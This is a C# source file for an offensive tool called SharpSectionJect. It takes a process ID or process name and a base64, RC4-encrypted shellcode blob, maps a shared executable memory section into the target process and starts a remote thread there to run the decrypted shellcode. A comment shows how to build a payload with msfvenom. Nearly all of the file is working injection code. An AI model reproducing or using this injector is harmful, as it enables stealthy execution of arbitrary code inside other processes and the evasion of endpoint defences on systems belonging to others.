using System;
using System.Runtime.InteropServices;

namespace SharpSectionJect
{
    public class SharpSectionJect
    {
        private const UInt32 SECTION_MAP_WRITE = 0x0002;
        private const UInt32 SECTION_MAP_READ = 0x0004;
        private const UInt32 SECTION_MAP_EXECUTE = 0x0008;

        private const uint PAGE_EXECUTE_READ = 0x00000020;
        private const uint PAGE_EXECUTE_READWRITE = 0x00000040;
        private const uint PAGE_READWRITE = 0x00000004;
        private const uint SEC_COMMIT = 0x8000000;
        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        //https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        private static byte[] RC4(byte[] key, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] keyBuf, box;
            byte[] cipher;

            keyBuf = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                keyBuf[i] = key[i % key.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + keyBuf[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        public static void Inj(string[] args)
        {
            UInt32 size = 4096, sectionSize = size;
            IntPtr sectionHandle = IntPtr.Zero, localSectionAddress = IntPtr.Zero, remoteSectionAddress = IntPtr.Zero;
            ulong sectionOffset = 0;

            if (args.Length == 3)
            {
                var currProc = System.Diagnostics.Process.GetCurrentProcess();
                var currProcHandle = currProc.Handle;
                var currProcSessionId = currProc.SessionId;

                NtCreateSection(ref sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
                NtMapViewOfSection(sectionHandle, currProcHandle, ref localSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out size, 2, (uint)0, PAGE_READWRITE);

                int tPid = -1;

                if (Int32.TryParse(args[0], out int _pid))
                    tPid = _pid;
                else
                {
                    var processes = System.Diagnostics.Process.GetProcessesByName(args[0].Replace(".exe", string.Empty));

                    if (processes.Length >= 1)
                    {
                        foreach (System.Diagnostics.Process proc in processes)
                        {
                            if (proc.SessionId == currProcSessionId)
                            {
                                tPid = proc.Id;
                                break;
                            }
                        }
                    }
                }

                if (tPid >= 0)
                {
                    IntPtr targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, tPid);

                    if (targetHandle != IntPtr.Zero)
                    {
                        NtMapViewOfSection(sectionHandle, targetHandle, ref remoteSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out size, 2, (uint)0, PAGE_EXECUTE_READ);

                        byte[] b64 = RC4(System.Text.Encoding.UTF8.GetBytes(args[2]), Convert.FromBase64String(args[1]));
                        Marshal.Copy(b64, 0, localSectionAddress, b64.Length);

                        IntPtr targetThreadHandle = IntPtr.Zero;
                        RtlCreateUserThread(targetHandle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, remoteSectionAddress, IntPtr.Zero, ref targetThreadHandle, IntPtr.Zero);
                    }
                    else
                        Console.WriteLine("Failed to open target process");
                }
                else
                    Console.WriteLine("Process with the name / PID of " + tPid + " is invalid.");
            }
            else
                Console.WriteLine("Usage: p.exe <pid/proc_name> <b64_sc> <sc_pwd>");
               //msfvenom -p windows/x64/exec CMD=calc.exe -f raw EXITFUNC=thread | base64 -w0
        }

        static void Main(string[] args)
        {
            Inj(args);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        private static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);
    }

}